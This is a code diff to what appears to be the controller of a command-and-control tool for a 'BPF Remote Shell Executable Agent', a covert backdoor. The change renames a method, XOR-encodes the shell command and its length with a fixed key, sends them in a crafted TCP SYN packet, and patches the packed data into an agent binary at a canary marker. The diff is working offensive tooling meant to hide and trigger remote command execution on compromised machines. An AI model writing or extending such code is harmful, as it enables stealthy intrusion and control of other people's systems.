@@ -12,7 +12,7 @@ class C2:
         self.args = args
         self.view = C2View(log_level=log_level, logfile=args.log_file)
 
-    def _get_packed_data(self, args: argparse.Namespace) -> bytes:
+    def _get_packed_config(self, args: argparse.Namespace) -> bytes:
         """Generates packed data for the BPF Remote Shell Executable Agent configuration.
 
         Args:
@@ -36,14 +36,17 @@ class C2:
             command = args.command.encode(encoding="utf-8")
         except UnicodeEncodeError:
             self.view.print_error("Could not encode shell command.")
+            return False
 
         cmd_len = struct.pack("!I", len(command))
+
+        payload = command + cmd_len
+        payload = bytes([b ^ 0x4F for b in payload])
 
         packet = (
             IP(dst=args.dip, src=args.sip)
             / TCP(dport=args.dport, sport=args.sport, flags="S", seq=args.seq)
-            / command
-            / cmd_len
+            / payload
         )
 
         if len(packet) > 5000:
@@ -83,7 +86,7 @@ class C2:
             self.view.print_error(f"Could not find agent canary.")
             return False
 
-        packed_data = self._get_packed_data(args)
+        packed_data = self._get_packed_config(args)
         new_data = agent_data[:index] + packed_data + agent_data[index + len(canary) :]
 
         output_dir = Path(args.output)
